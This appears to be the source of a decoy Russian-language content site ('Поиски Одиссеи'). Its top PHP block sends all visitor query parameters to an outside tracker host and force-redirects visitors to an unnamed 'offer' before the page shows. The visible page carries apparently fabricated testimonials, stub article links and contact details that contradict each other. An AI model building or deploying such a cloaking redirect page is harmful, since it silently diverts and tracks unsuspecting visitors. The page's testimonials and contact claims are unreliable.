<?php
// Query params are: undefined 

require_once dirname(__FILE__) . '/kclient.php';
$client = new KClient('https://traveling-actual.ru/', 'zm546PCsfpWB7GCb');
$client->sendAllParams();       // to send all params from page query
$client->forceRedirectOffer();       // redirect to offer if an offer is chosen
// $client->param('sub_id_5', '123'); // you can send any params
// $client->keyword('PASTE_KEYWORD');  // send custom keyword
// $client->currentPageAsReferrer(); // to send current page URL as click referrer
// $client->disableSessions(); // to disable using session cookie (without this cookie restoreFromSession wouldn't work)
// $client->debug();              // to enable debug mode and show the errors
// $client->execute();             // request to api, show the output and continue
$client->executeAndBreak();     // to stop page execution if there is redirect or some output
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
     
    <title>Главная</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="css/bootstrap.min.css" type="text/css" />
    <link rel="stylesheet" type="text/css" href="css/materialdesignicons.min.css" />
    <link rel="stylesheet" type="text/css" href="css/style.css" />
  </head>

  <body data-bs-spy="scroll" data-bs-target="#navbar" data-bs-offset="71">
    <!--Navbar Start-->
    <nav class="navbar navbar-expand-lg fixed-top navbar-custom sticky sticky-dark" id="navbar">
      <div class="container">
        <!-- LOGO -->
        <a class="navbar-brand logo" href="index.php"> Поиски Одиссеи </a>
        <button
          class="navbar-toggler"
          type="button"
          data-bs-toggle="collapse"
          data-bs-target="#navbarCollapse"
          aria-controls="navbarCollapse"
          aria-expanded="false"
          aria-label="Toggle navigation"
        >
          <i class="mdi mdi-menu"></i>
        </button>
        <div class="collapse navbar-collapse" id="navbarCollapse">
          <ul class="navbar-nav ms-auto navbar-center" id="mySidenav">
            <li class="nav-item"><a class="nav-link" href="index.php">Главная</a></li>
            <li class="nav-item">
              <a class="nav-link" href="blog.php">Статьи</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="contact.php">Контакты</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="privacy.php">Политика конфиденциальности</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="terms.php">Условия и положения</a>
            </li>
          </ul>
        </div>
      </div>
    </nav>
    <!-- Navbar End -->

    <!-- START SOFTWERE-HOME -->
    <section class="softwere-home" id="home" style="background-image: url('./assets/images/bulksplash-opeleye-kjkrwgnn2bi.jpg')">
      <div class="bg-overlay"></div>
      <div class="home-center">
        <div class="home-desc-center">
          <div class="container">
            <div class="row align-items-center">
              <div class="col-lg-6">
                <div class="softwere-home-content text-white mt-4">
                  <h4 class="softwere-home-title text-uppercase line-height_1_4 letter-spacing_4">
                    Популярные
                  </h4>
                </div>
              </div>
            </div>
          </div>

          <div class="container-fluid">
            <div class="row">
              <div class="softwere-home-shape-img">
                <img
                  src="images/home-softwere-shape.png"
                  alt=""
                  class="img-fluid mx-auto d-block"
                />
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- START TESTIMONIAL -->
    <section class="section testimonial" id="client">
      <div class="container">
        <div class="row justify-content-center">
          <div class="col-lg-8">
            <div class="text-center">
              <h2 class="heading-title-title letter-spacing_4 text-uppercase">
                Отзывы
              </h2>
            </div>
          </div>
        </div>

        <div class="row mt-5 pt-3">
          <div class="col-lg-12">
            <div id="agency-owl-demo">
              <div id="carouselExampleControls" class="carousel slide" data-bs-ride="carousel">
                <div class="carousel-inner">
                  
                  <div class="carousel-item active">
                    <div class="agency-testimonial-box text-center ml-2 mr-2 p-5">
                      <div class="agency-testi-desc bg-white">
                        <p class="text-muted f-17 mb-0">Сайт - отличное место, чтобы открыть для себя новые точки зрения на проблемы. Это отличный способ бросить вызов своим собственным убеждениям.</p>
                      </div>

                      <div class="agency-testimonial-img mt-5 pt-3">
                        <img
                          src="./assets/images/avatar_16669583958028.jpeg"
                          class="img-fluid rounded-circle"
                          alt=""
                          style="height: 80px; object-fit: cover"
                        />
                        <div class="mt-4">
                          <h5 class="text-uppercase f-15 letter-spacing_2">Доктор Эфраин Штамм</h5>
                          <p class="text-muted f-13 mb-0"></p>
                        </div>
                      </div>
                    </div>
                  </div>
                  
 
                  <div class="carousel-item">
                    <div class="agency-testimonial-box text-center ml-2 mr-2 p-5">
                      <div class="agency-testi-desc bg-white">
                        <p class="text-muted f-17 mb-0">Мне нравится, как сайт предоставляет глобальный взгляд на проблемы. Важно понимать, как разные страны подходят к различным вопросам.</p>
                      </div>

                      <div class="agency-testimonial-img mt-5 pt-3">
                        <img
                          src="./assets/images/avatar_16669580077194.jpeg"
                          class="img-fluid rounded-circle"
                          alt=""
                          style="height: 80px; object-fit: cover"
                        />
                        <div class="mt-4">
                          <h5 class="text-uppercase f-15 letter-spacing_2">Мистер Амос Манн</h5>
                          <p class="text-muted f-13 mb-0"></p>
                        </div>
                      </div>
                    </div>
                  </div>
                  

                  <div class="carousel-item">
                    <div class="agency-testimonial-box text-center ml-2 mr-2 p-5">
                      <div class="agency-testi-desc bg-white">
                        <p class="text-muted f-17 mb-0">Я действительно ценю вашу работу. Сайт предлагает очень интересные темы и статьи, которые мне действительно нравятся.</p>
                      </div>

                      <div class="agency-testimonial-img mt-5 pt-3">
                        <img
                          src="./assets/images/avatar_16669571024610.jpeg"
                          class="img-fluid rounded-circle"
                          alt=""
                          style="height: 80px; object-fit: cover"
                        />
                        <div class="mt-4">
                          <h5 class="text-uppercase f-15 letter-spacing_2">Рузвельт Мюррей II</h5>
                          <p class="text-muted f-13 mb-0"></p>
                        </div>
                      </div>
                    </div>
                  </div>
                  

                  <div class="carousel-item">
                    <div class="agency-testimonial-box text-center ml-2 mr-2 p-5">
                      <div class="agency-testi-desc bg-white">
                        <p class="text-muted f-17 mb-0">Статьи на этом сайте написаны экспертами в своих соответствующих областях, поэтому вы всегда можете доверять информации, которую получаете.</p>
                      </div>

                      <div class="agency-testimonial-img mt-5 pt-3">
                        <img
                          src="./assets/images/avatar_16669586371769.jpeg"
                          class="img-fluid rounded-circle"
                          alt=""
                          style="height: 80px; object-fit: cover"
                        />
                        <div class="mt-4">
                          <h5 class="text-uppercase f-15 letter-spacing_2">Руби Виндлер</h5>
                          <p class="text-muted f-13 mb-0"></p>
                        </div>
                      </div>
                    </div>
                  </div>
                  

                </div>
                <button
                  class="carousel-control-prev"
                  type="button"
                  data-bs-target="#carouselExampleControls"
                  data-bs-slide="prev"
                >
                  <i class="mdi mdi-menu-left"></i>
                </button>
                <button
                  class="carousel-control-next"
                  type="button"
                  data-bs-target="#carouselExampleControls"
                  data-bs-slide="next"
                >
                  <i class="mdi mdi-menu-right"></i>
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <!-- END TESTIMONIAL -->

    <!-- START BLOG -->
    <section class="section blog" id="news">
      <div class="container">
        <div class="row justify-content-center">
          <div class="col-lg-8">
            <div class="text-center">
              <h2 class="heading-title-title letter-spacing_4 text-uppercase">
                Статьи
              </h2>
            </div>
          </div>
        </div>

        <div class="row mt-5 pt-3">
          
          <div class="col-lg-4">
            <div class="mt-4">
              <div>
                <img
                  src="./assets/images/bulksplash-opeleye-kjkrwgnn2bi.jpg"
                  style="width: 100%; height: 240px; object-fit: cover"
                  class="img-fluid"
                  alt=""
                />
              </div>
              <div class="bg-white p-4">
                <div class="agency-blog-info">
                  <h5 class="f-16 line-height_1_6">
                    <a href="9388defd33ebce4dd9f8b37c3847d409.php">10 основных совет...</a>
                  </h5>
                  <div class="mt-3">
                    <a href="9388defd33ebce4dd9f8b37c3847d409.php" class="more-details text-uppercase text-muted fw-bold f-12"
                      >Читать далее <i class="mdi mdi-arrow-right"></i
                    ></a>
                  </div>
                </div>
              </div>
            </div>
          </div>
          

          <div class="col-lg-4">
            <div class="mt-4">
              <div>
                <img
                  src="./assets/images/bulksplash-alicekat-z9f_yk4nmf8.jpg"
                  style="width: 100%; height: 240px; object-fit: cover"
                  class="img-fluid"
                  alt=""
                />
              </div>
              <div class="bg-white p-4">
                <div class="agency-blog-info">
                  <h5 class="f-16 line-height_1_6">
                    <a href="baa47e9101471c8a6dd7830a5d895ed0.php">Основные советы ...</a>
                  </h5>
                  <div class="mt-3">
                    <a href="baa47e9101471c8a6dd7830a5d895ed0.php" class="more-details text-uppercase text-muted fw-bold f-12"
                      >Читать далее <i class="mdi mdi-arrow-right"></i
                    ></a>
                  </div>
                </div>
              </div>
            </div>
          </div>
          

          <div class="col-lg-4">
            <div class="mt-4">
              <div>
                <img
                  src="./assets/images/bulksplash-alexforestier-klfdghxogpm.jpg"
                  style="width: 100%; height: 240px; object-fit: cover"
                  class="img-fluid"
                  alt=""
                />
              </div>
              <div class="bg-white p-4">
                <div class="agency-blog-info">
                  <h5 class="f-16 line-height_1_6">
                    <a href="y0a9YHnD0qVRGq6m4BKcB3FH.php">Основные советы ...</a>
                  </h5>
                  <div class="mt-3">
                    <a href="y0a9YHnD0qVRGq6m4BKcB3FH.php" class="more-details text-uppercase text-muted fw-bold f-12"
                      >Читать далее <i class="mdi mdi-arrow-right"></i
                    ></a>
                  </div>
                </div>
              </div>
            </div>
          </div>
          

        </div>
      </div>
    </section>
    <!-- END BLOG -->

    <!-- START CONTACT -->
    <section class="section agency-contact" id="contact">
      <div class="container">
        <div class="row justify-content-center">
          <div class="col-lg-8">
            <div class="text-center">
              <h2 class="heading-title-title letter-spacing_4 text-uppercase">
                Контакты
              </h2>
            </div>
          </div>
        </div>

        <div class="row mt-5 pt-3 align-items-center">
          <div class="col-lg-12 text-center">
            <div class="mt-4">
              <div
                style="
                  background-image: url('images/map.png');
                  background-repeat: no-repeat;
                  background-size: cover;
                  background-position: center;
                "
                class="pb-3"
              >
                <div class="mt-3">
                  <div class="agency-contact-info ps-4">
                    <p class="text-muted">apollon33@mail.ru</p>
                  </div>
                </div>
                <div class="mt-3">
                  <div class="agency-contact-info ps-4">
                    <p class="text-muted">992490, Томская область, город Подольск, бульвар Косиора, 29</p>
                  </div>
                </div>
                <div class="mt-3">
                  <div class="agency-contact-info ps-4">
                    <p class="text-muted">+5815041230831</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <!-- END CONTACT -->

    <!-- START FOOTER -->
    <footer class="section-footer bg-softwere-footer">
      <div class="container">
        <div class="row mt-4 py-4">
          <div class="col-lg-12">
            <div class="text-center">
              <p class="copy-rights text-white mb-0">
                ©
                <script>
                  document.write(new Date().getFullYear());
                </script>
                Copyright
              </p>
            </div>
          </div>
        </div>
      </div>
    </footer>
    <!-- END FOOTER -->

    <script>
      let elems = document.querySelectorAll('.server-name');
      elems.forEach((elem) => {
        elem.innerHTML = window.location.hostname;
      });
    </script>

    <script src="js/script.js"></script>
    <script src="js/bootstrap.bundle.min.js"></script>
  </body>
</html>
